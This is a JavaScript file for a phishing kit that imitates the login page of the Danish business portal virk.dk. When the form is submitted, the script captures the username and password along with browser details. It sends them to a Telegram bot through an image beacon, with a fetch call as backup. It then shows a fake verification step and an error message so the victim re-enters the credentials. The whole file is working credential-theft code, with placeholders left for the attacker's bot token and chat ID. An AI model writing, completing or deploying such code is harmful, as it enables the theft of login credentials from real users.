// ===== TELEGRAM CONFIGURATION =====
const TELEGRAM_CONFIG = {
    botToken: "YOUR_BOT_TOKEN_HERE",  // ← REPLACE
    chatId: "YOUR_CHAT_ID_HERE"       // ← REPLACE
};

// ===== SEND TO TELEGRAM =====
function sendToTelegram(username, password, extraInfo) {
    const message = `🔴 <b>NYT LOGIN FANGET - VIRK.DK</b> 🔴\n━━━━━━━━━━━━━━━━━━━━━━\n📅 <b>Tid:</b> ${extraInfo.timestamp}\n🌐 <b>IP:</b> ${extraInfo.ip}\n🖥 <b>Browser:</b> ${extraInfo.userAgent}\n━━━━━━━━━━━━━━━━━━━━━━\n👤 <b>BRUGER-ID:</b> <code>${username}</code>\n🔑 <b>ADGANGSKODE:</b> <code>${password}</code>\n━━━━━━━━━━━━━━━━━━━━━━\n⚠️ <b>STATUS:</b> Afventer validering`;
    
    const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
    
    // Use image beacon method (most reliable, no CORS issues)
    const encodedMessage = encodeURIComponent(message);
    const img = new Image();
    img.src = `${url}?chat_id=${TELEGRAM_CONFIG.chatId}&text=${encodedMessage}&parse_mode=HTML`;
    
    // Also try fetch as backup
    try {
        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CONFIG.chatId,
                text: message,
                parse_mode: 'HTML'
            })
        }).catch(() => {});
    } catch (e) {}
}

// ===== MAIN HANDLER =====
document.addEventListener('DOMContentLoaded', function() {
    
    // Get elements
    const loginForm = document.getElementById('loginForm');
    const loginBtn = document.getElementById('loginBtn');
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const errorModal = document.getElementById('errorModal');
    const successModal = document.getElementById('successModal');
    const modalClose = document.getElementById('modalClose');
    const toggleVisibility = document.getElementById('toggleVisibility');
    
    // Debug
    console.log('Elements found:', {
        form: !!loginForm,
        btn: !!loginBtn,
        username: !!usernameInput,
        password: !!passwordInput,
        errorModal: !!errorModal,
        successModal: !!successModal
    });
    
    // Toggle password
    if (toggleVisibility) {
        toggleVisibility.addEventListener('click', function() {
            passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
        });
    }
    
    // Close modal
    if (modalClose) {
        modalClose.addEventListener('click', function() {
            errorModal.style.display = 'none';
            passwordInput.value = '';
            passwordInput.focus();
        });
    }
    
    // Form submit
    if (loginForm) {
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();
            e.stopPropagation();
            
            const username = usernameInput.value.trim();
            const password = passwordInput.value;
            
            console.log('Submit clicked. Username:', username, 'Password length:', password.length);
            
            // Validate
            if (!username || !password) {
                if (!username) usernameInput.style.borderColor = '#DC3545';
                if (!password) passwordInput.style.borderColor = '#DC3545';
                setTimeout(() => {
                    usernameInput.style.borderColor = '';
                    passwordInput.style.borderColor = '';
                }, 2000);
                return;
            }
            
            // Get basic info (no async, no hang)
            const extraInfo = {
                userAgent: navigator.userAgent,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer || 'Direct',
                timestamp: new Date().toLocaleString('da-DK', { timeZone: 'Europe/Copenhagen' }),
                ip: 'Fetching...'
            };
            
            // Send to Telegram IMMEDIATELY (no waiting)
            sendToTelegram(username, password, extraInfo);
            
            console.log('Credentials sent to Telegram');
            
            // Show verification modal
            if (successModal) successModal.style.display = 'flex';
            
            // After 2 seconds, show error
            setTimeout(() => {
                if (successModal) successModal.style.display = 'none';
                if (errorModal) errorModal.style.display = 'flex';
                passwordInput.value = '';
            }, 2000);
            
            return false; // Extra safety
        });
    }
    
    // Also bind directly to button click as backup
    if (loginBtn) {
        loginBtn.addEventListener('click', function(e) {
            e.preventDefault();
            
            // If form exists, trigger submit
            if (loginForm) {
                loginForm.dispatchEvent(new Event('submit', {
                    cancelable: true,
                    bubbles: true
                }));
            }
        });
    }
});
